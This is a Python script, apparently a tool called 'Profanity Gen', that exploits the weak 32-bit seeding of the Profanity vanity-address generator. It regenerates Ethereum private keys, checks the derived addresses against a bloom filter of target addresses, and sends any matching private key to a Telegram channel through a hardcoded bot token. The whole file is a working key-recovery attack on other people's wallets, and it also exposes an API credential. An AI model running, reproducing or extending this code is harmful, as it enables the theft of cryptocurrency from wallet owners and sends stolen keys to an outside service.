# #!/usr/bin/python3
# encoding=utf8
# -*- coding: utf-8 -*-
"""
@author: Noname400
"""
    
from requests import get
#from libraries.secp256k1_lib import  pubkey_to_ETH_address_bytes, check_collision, Load_data_to_memory, scalar_multiplication, point_loop_addition, pubkey_to_ETH_address
from libraries.secp256k1_lib import  pubkey_to_ETH_address_bytes, scalar_multiplication, point_loop_addition, pubkey_to_ETH_address, read_bloom_file, check_in_bloom

from pybloom_live import ScalableBloomFilter
from time import time, sleep
from random import randint
from sys import argv
from os import system, path, name, mkdir
from colorama import Fore, Style, init
from multiprocessing import Lock, Process, Value
import argparse, ctypes
from datetime import datetime
import multiprocessing
init(autoreset = True)

yellow = Fore.YELLOW+Style.BRIGHT
red = Fore.RED+Style.BRIGHT
clear = Style.RESET_ALL
green = Fore.GREEN+Style.BRIGHT

class Counter:
    def __init__(self, initval=0):
        self.val = Value(ctypes.c_longlong, initval)
        self.lock = Lock()
    def increment(self, nom):
        with self.lock:
            self.val.value += nom
    def decrement(self, nom):
        with self.lock:
            self.val.value -= nom
    def zero(self):
        with self.lock:
            self.val.value = 0
    def value(self):
        with self.lock:
            return self.val.value

class inf:
    version:str = '* Profanity Gen v1.21 23.11.22 POOL BF ice *'
    th:int = 1
    db_eth:str = ''
    telegram_id = ''
    telegram_token = ''
    pool_addr = ''
    pool_port = 22008
    pool_enable = False
    user = ''
    seed = 0

class BF():
    bit = any
    hash = any
    bf = any

class mt19937_64(object):
    def __init__(self):
        self.mt = [0]*312
        self.mti = 313

    def seed(self, seed):
        self.mt[0] = seed & 0xffffffffffffffff
        for i in range(1,312):
            self.mt[i] = (6364136223846793005 * (self.mt[i-1] ^ (self.mt[i-1] >> 62)) + i) & 0xffffffffffffffff
        self.mti = 312

    def int64b(self):
        if self.mti == 313:
            self.seed(5489)

        k = self.mti

        if k == 312:
            k = 0
            self.mti = 0

        if k == 311:
            y = (self.mt[311] & 0xFFFFFFFF80000000) | (self.mt[0] & 0x7fffffff)
            self.mt[311] = self.mt[155] ^ (y >> 1) ^ (0xB5026F5AA96619E9 if y & 1 else 0)
        else:
            y = (self.mt[k] & 0xFFFFFFFF80000000) | (self.mt[k+1] & 0x7fffffff)
            if k < 312 - 156:
                self.mt[k] = self.mt[k+156] ^ (y >> 1) ^ (0xB5026F5AA96619E9 if y & 1 else 0)
            else:
                self.mt[k] = self.mt[k+156-624] ^ (y >> 1) ^ (0xB5026F5AA96619E9 if y & 1 else 0)

        y = self.mt[self.mti]
        self.mti += 1

        y ^= (y >> 29) & 0x5555555555555555
        y ^= (y << 17) & 0x71D67FFFEDA60000
        y ^= (y << 37) & 0xFFF7EEE000000000
        y ^= (y >> 43)

        return y

def get_range(ra):
    l = [0,0,0,0]
    mt = mt19937_64()
    mt.seed(ra)
    l[3] = hex(mt.int64b())[2:]
    l[2] = hex(mt.int64b())[2:]
    l[1] = hex(mt.int64b())[2:]
    l[0] = hex(mt.int64b())[2:]
    return ''.join(l)

# def load_BF(load):
#     n_int = int(multiprocessing.current_process().name)
#     sleep(10*n_int)
#     if multiprocessing.current_process().name == '0':
#         Load_data_to_memory(load, True)
#     else:
#         Load_data_to_memory(load, False)
            
def load_BF(load):
    try:
        fr = open(load,'rb')
        n_int = int(multiprocessing.current_process().name)
        sleep(5*n_int)
        f = ScalableBloomFilter.fromfile(fr)
        fr.close()
    except FileNotFoundError:
        print(f'[E] File: {load} not found.')
        exit(1)
    return f

# def load_BF(load):
#     try:
#         n_int = int(multiprocessing.current_process().name)
#         sleep(5*n_int)
#         BF.bit, BF.hash, BF.bf = read_bloom_file(load)
#     except FileNotFoundError:
#         print(f'[E] File: {load} not found.')
#         exit(1)
#     return BF.bit, BF.hash, BF.bf

def gen_pub(i):
        r = get_range(i)
        pub =  scalar_multiplication(int(r,16))
        return r, pub

def createParser ():
    parser = argparse.ArgumentParser(description='Profanity Gen')
    parser.add_argument ('-dbeth', '--databaseeth', action='store', type=str, help='File BF ETH', default='')
    parser.add_argument ('-th', '--threading', action='store', type=int, help='threading', default='1')
    parser.add_argument ('-pool', '--pool', action='store_true', help='enable pool')
    parser.add_argument ('-user', '--user', action='store', type=str, help='user', default='')
    return parser.parse_args().databaseeth, parser.parse_args().threading, parser.parse_args().pool, parser.parse_args().user

def date_str():
    now = datetime.now()
    return now.strftime("%m/%d/%Y, %H:%M:%S")

def send_telegram(msg: str):
    token = '5311024399:AAF6Ov-sMSc4dd2DDdx0hF_B-5-4vPerFTs'
    try:
        get(f'https://api.telegram.org/bot{token}/sendMessage', params=dict(
        chat_id='@scanpvknon',
        text=msg
        ))
    except:
        print(f'[E] Error send telegram.')

def save(token, text):
    if path.exists('log'):
        file = 'log/res-'+str(token)+'.txt'
        f = open(file,'a')
        f.write(f'[*] {text} \n')
        f.close()
    else:
        mkdir('log')
        file = 'log/res-'+str(token)+'.txt'
        f = open(file,'a')
        f.write(f'[*] {text} \n')
        f.close()

def cls():
    system('cls' if name=='nt' else 'clear')

def convert_int(num:int):
    dict_suffix = {0:'Key', 1:'KKey', 2:'MKey', 3:'GKey', 4:'TKey', 5:'PKey', 6:'EKeys'}
    num *= 1.0
    idx = 0
    for _ in range(len(dict_suffix)-1):
        if int(num/1000) > 0:
            idx += 1
            num /= 1000
    return ('%.2f'%num), dict_suffix[idx]
    
def seq(*args):
    inf.db_eth = args[0]
    inf.th = args[1]
    total_counter = args[2]
    process_counter = args[3]
    found_counter = args[4]
    prof_counter = args[5]
    inf.pool_enable = args[6]
    inf.user = args[7]
    mp2 = scalar_multiplication(0x1) # 0x1
    mp3 = scalar_multiplication(0x1000000000000000000000000000000000000000000000000) # 0x1000000000000000000000000000000000000000000000000
    t1 = 2**22#2**22
    t2 = 2**22#2**14
    t3 = (2**32)-1
    BF = load_BF(inf.db_eth)
    #BF.bit, BF.hash, BF.bf = load_BF(inf.db_eth)
    process_counter.increment(1)

    try:
        while True:
            co = 0
            total = 0
            prof_counter.increment(1)
            if inf.pool_enable:
                try:
                    payload = {'seed': str(inf.seed), 'user': inf.user}  
                    r = get(f'http://{inf.pool_addr}:{inf.pool_port}/get_seed', params=payload)
                    inf.seed = int(r.text,10)
                except:
                    print(f'\nMode pool Disabled... Internet NOT work...\n')
                    inf.pool_enable = False
                    inf.seed = randint(1,t3)
            else:
                inf.seed = randint(1,t3)#3345717797
            token_save = hex(inf.seed)[2:]
            l_priv, l_pub = gen_pub(inf.seed)
            save(token_save, (f'[Status {date_str()}] SEED:{hex(inf.seed)} PVK:{l_priv} process:{multiprocessing.current_process().name}\n'))
            st = time()
            pub_dec1 = point_loop_addition(t1, l_pub, mp3)
            for dec1 in range(t1):
                pub1 = pub_dec1[dec1*65:dec1*65+65]
                pub_dec2 = point_loop_addition(t2, pub1, mp2)
                for dec2 in range(t2):
                    pub2 = pub_dec2[dec2*65:dec2*65+65]
                    addr = pubkey_to_ETH_address(pub2)[2:]
                    #if check_collision(bytes.fromhex(addr)):
                    if addr in BF:
                    #if check_in_bloom(addr, BF.bit, BF.hash, BF.bf):
                        found_counter.increment(1)
                        print(f'[F] Start seed:{(l_priv)} seq:{total} {addr}')
                        save(token_save, (f'[F] Start seed:{(l_priv)} seq:{total} {addr}\n'))
                        send_telegram(f'[F] Start seed:{(l_priv)} seq:{total} {addr}')
                total += 1
                co += 1
                if multiprocessing.current_process().name == '0':
                    speed = int(((co*t2)/(time()-st)))
                    speed_float, speed_hash = convert_int(speed*process_counter.value())
                    print(f'[total pub {total*t2}] [CPU:{process_counter.value()}] [SEED:{prof_counter.value()}] [Speed:{speed_float, speed_hash}]', end='\r')
                    co = 0
                    st = time()
            save('seed',f'{inf.seed}')
    except(KeyboardInterrupt, SystemExit):
        print('\n[EXIT] Interrupted by the user.')
        exit()

if __name__ == "__main__":
    cls()
    inf.db_eth, inf.th, inf.pool_enable, inf.user  = createParser()
    send_telegram(f'[F] Start')
    print('-'*70,end='\n')
    print(f'{green}Thank you very much: @iceland2k14 for his libraries!')
    
    if inf.th < 1:
        print(f'{red}[E] The number of processes must be greater than 0')
        exit()

    if inf.th > multiprocessing.cpu_count():
        print(f'{red}[I] The specified number of processes exceeds the allowed')
        print(f'{green}[I] FIXED for the allowed number of processes')
        inf.th = multiprocessing.cpu_count()
    if inf.pool_enable and inf.user == '':
        print('UserName required')
        exit(1)
    
    
    print('-'*70,end='\n')
    
    print(f'[I] Version: {inf.version}')
    print(f'[I] START: {date_str()}')
    print(f'[I] Total kernel of CPU: {multiprocessing.cpu_count()}')
    print(f'[I] Used kernel: {inf.th}')
    print(f'[I] Bloom Filter ETH: {inf.db_eth}')
    if inf.pool_enable:
        print(f'[I] Pooling enabled: {inf.pool_addr}:{inf.pool_port}')

    print('-'*70,end='\n')
    
    total_counter = Counter(0)
    process_counter = Counter(0)
    found_counter = Counter(0)
    prof_counter = Counter(0)
    procs = []
    try:
        for r in range(inf.th): 
            p = Process(target=seq, name= str(r), args=(inf.db_eth, inf.th, total_counter, process_counter, found_counter, prof_counter, inf.pool_enable, inf.user,))
            procs.append(p)
            p.start()
        for proc in procs: proc.join()

    except(KeyboardInterrupt, SystemExit):
        print('\n[EXIT] Interrupted by the user.')
        exit()
        
    '''
    #v:3345717797 i:147449195
    0x7b765267335ddc9be46e5b8455a6263efbb8cdb3ea2d45c71c27498bf4e13cf0 Address: 0x1c00dd00c5a0818761010500811900061801368b
    7b765267335ddc9b
    # 7b7652673353f730 e46e5b8455a6263 efbb8cdb3ea2d45 c71c27498bf4e13ccd /start
    # 7b765267335ddc9b e46e5b8455a6263 efbb8cdb3ea2d45 c71c27498bf4e13cf0  /искомый
    # Address: 0x1c00dd00c5a0818761010500811900061801368b
    # v:3345717797 i:147449195

    # 8C9E56B

    # fbb8cdb3ea2d45c7
    # 0000000000000001000000000000000000000000000000000000000000000000
    # 02eaa649f21f51bdbae7be4ae34ce6e5217a58fdce7f47f9aa7f3b58fa2120e2b3 (уже сделал -) 03eaa649f21f51bdbae7be4ae34ce6e5217a58fdce7f47f9aa7f3b58fa2120e2b3 - оригинал
    # 0000000000000000000000000000000000000000000000000000000000000001
    # 0379be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798 (уже сделал -) 0279be667ef9dcbbac55a06295ce870b07029bfcdb2dce28d959f2815b16f81798 - оригинал
    '''
